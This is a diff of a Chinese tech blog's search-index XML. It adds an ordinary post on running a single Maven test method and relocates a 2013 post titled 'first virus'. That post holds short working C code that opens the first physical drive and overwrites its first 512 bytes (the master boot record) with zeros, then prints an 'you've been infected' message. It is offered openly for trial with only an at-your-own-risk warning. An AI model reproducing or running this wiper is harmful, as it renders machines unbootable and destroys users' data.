@@ -3,6 +3,35 @@
   
     
     <entry>
+      <title><![CDATA[maven测试指定测试方法]]></title>
+      <url>/2025/mvn-testcase/</url>
+      <content type="html"><![CDATA[<p>maven 是一款软件项目管理以及自动构建工具<br><a id="more"></a></p>
+<p>常见的测试命令</p>
+<p>全量测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn test</span><br></pre></td></tr></table></figure>
+<p>指定测试方法</p>
+<p>mvn test -Dtest=测试类名#方法名 -pl 子模块名称</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn test -Dtest=org.apache.seata.spring.boot.autoconfigure.SeataCoreAutoConfigurationTest -pl seata-spring-autoconfigure -Dspring-boot.version=3.2.0 -Dspring-framework.version=6.1.1</span><br></pre></td></tr></table></figure>
+]]></content>
+      
+        <categories>
+            
+            <category> java </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> java </tag>
+            
+            <tag> maven </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[flutter开发常见问题]]></title>
       <url>/2025/flutter-faq/</url>
       <content type="html"><![CDATA[<p>flutter 开发常见问题<br><a id="more"></a></p>
@@ -3840,29 +3869,6 @@ y_i=\sum_jw_jx_{ij}</script><ol>
     </entry>
     
     <entry>
-      <title><![CDATA[第一个病毒]]></title>
-      <url>/2013/first-virus/</url>
-      <content type="html"><![CDATA[<p>这篇文章主要讲解 使用c写一个小程序<br>下面是初学c语言写的代码（测试，自行承担后果哦）：<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;stdlib.h&gt; </span><br><span class="line"> </span><br><span class="line">int main() </span><br><span class="line">&#123;</span><br><span class="line"> char buffer[512]=&quot;0&quot;;</span><br><span class="line">    FILE * fd=fopen(&quot;\\\\.\\PHYSICALDRIVE0&quot;,&quot;rb+&quot;); </span><br><span class="line">    if (fd == NULL) </span><br><span class="line">        return 0;  </span><br><span class="line">    fseek(fd,0,SEEK_SET); </span><br><span class="line">    fwrite(buffer,512,1,fd);</span><br><span class="line"> printf(&quot;hello,你中毒了！\n&quot;);</span><br><span class="line">    fclose(fd); </span><br><span class="line">    return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-]]></content>
-      
-        <categories>
-            
-            <category> c </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> c </tag>
-            
-            <tag> 病毒 </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
       <title><![CDATA[任意进制的转换]]></title>
       <url>/2013/java-any-hex-convert/</url>
       <content type="html"><![CDATA[<p>这篇文章主要讲解 BigInteger实现进制转换</p>
@@ -3902,6 +3908,29 @@ y_i=\sum_jw_jx_{ij}</script><ol>
         <tags>
             
             <tag> javascript </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[第一个病毒]]></title>
+      <url>/2013/first-virus/</url>
+      <content type="html"><![CDATA[<p>这篇文章主要讲解 使用c写一个小程序<br>下面是初学c语言写的代码（测试，自行承担后果哦）：<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;stdlib.h&gt; </span><br><span class="line"> </span><br><span class="line">int main() </span><br><span class="line">&#123;</span><br><span class="line"> char buffer[512]=&quot;0&quot;;</span><br><span class="line">    FILE * fd=fopen(&quot;\\\\.\\PHYSICALDRIVE0&quot;,&quot;rb+&quot;); </span><br><span class="line">    if (fd == NULL) </span><br><span class="line">        return 0;  </span><br><span class="line">    fseek(fd,0,SEEK_SET); </span><br><span class="line">    fwrite(buffer,512,1,fd);</span><br><span class="line"> printf(&quot;hello,你中毒了！\n&quot;);</span><br><span class="line">    fclose(fd); </span><br><span class="line">    return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+]]></content>
+      
+        <categories>
+            
+            <category> c </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> c </tag>
+            
+            <tag> 病毒 </tag>
             
         </tags>
         
